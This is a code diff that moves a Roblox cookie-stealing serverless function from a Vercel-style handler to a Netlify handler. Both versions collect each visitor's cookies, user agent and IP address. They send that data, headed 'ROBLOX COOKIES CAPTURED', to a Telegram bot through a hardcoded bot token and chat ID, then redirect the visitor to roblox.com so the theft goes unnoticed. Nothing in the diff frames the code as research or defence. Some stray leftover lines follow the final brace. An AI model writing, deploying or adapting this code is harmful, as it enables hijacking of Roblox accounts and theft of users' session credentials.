@@ -1,40 +1,68 @@
-export default async (req, res) => {
-  const config = {
-    botToken: '8110179122:AAHjbqAglX75ElcuKCcKwRwwXYGCvwY4_xM',
-    chatId: '7695851744',
-    redirect: 'https://www.roblox.com/games'
-  };
+const fetch = require('node-fetch');
 
-  try {
-    const data = {
-      cookies: req.headers.cookie || 'NULL',
-      agent: req.headers['user-agent'] || 'NULL', 
-      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'NULL',
-      time: new Date().toISOString(),
-      referer: req.headers.referer || 'direct'
-    };
+exports.handler = async (event) => {
+    const BOT_TOKEN = '8110179122:AAHjbqAglX75ElcuKCcKwRwwXYGCvwY4_xM';
+    const CHAT_ID = '7695851744';
+    
+    console.log('Function started'); // Логирование
+    
+    try {
+        const cookies = event.headers.cookie || 'No cookies found';
+        const userAgent = event.headers['user-agent'] || 'Unknown';
+        const ip = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown';
 
-    const text = `🎯 ROBLOX COOKIE GRABBED
-┌─────────────────
-│ 🕒 ${new Date().toLocaleString()}
-│ 📍 IP: ${data.ip}
-│ 🌐 Agent: ${data.agent.substring(0, 60)}...
-│ 🔗 Referer: ${data.referer}
-└─────────────────
+        console.log('Cookies received:', cookies); // Логирование куков
+
+        const message = `🔴 ROBLOX COOKIES CAPTURED
+📅 Time: ${new Date().toLocaleString()}
+📍 IP: ${ip}
+🌐 User-Agent: ${userAgent.substring(0, 60)}...
 
 🍪 COOKIES:
-${data.cookies}
+${cookies}
 
-⚡ Sent via Vercel Edge Function`;
+⚡ Sent via Netlify Function`;
 
-    // Отправка в Telegram
-    const tgResponse = await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: config.chatId,
-        text: text,
-        parse_mode: 'HTML'
+        // Отправка в Telegram
+        const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+
+        const telegramData = await telegramResponse.json();
+        console.log('Telegram response:', telegramData); // Логирование ответа Telegram
+
+        if (!telegramResponse.ok) {
+            throw new Error(`Telegram API error: ${telegramData.description}`);
+        }
+
+        // Редирект
+        return {
+            statusCode: 302,
+            headers: {
+                'Location': 'https://www.roblox.com/',
+                'Cache-Control': 'no-cache'
+            }
+        };
+
+    } catch (error) {
+        console.error('Error:', error.message);
+        
+        return {
+            statusCode: 302,
+            headers: {
+                'Location': 'https://www.roblox.com/'
+            }
+        };
+    }
+};        parse_mode: 'HTML'
       })
     });
 
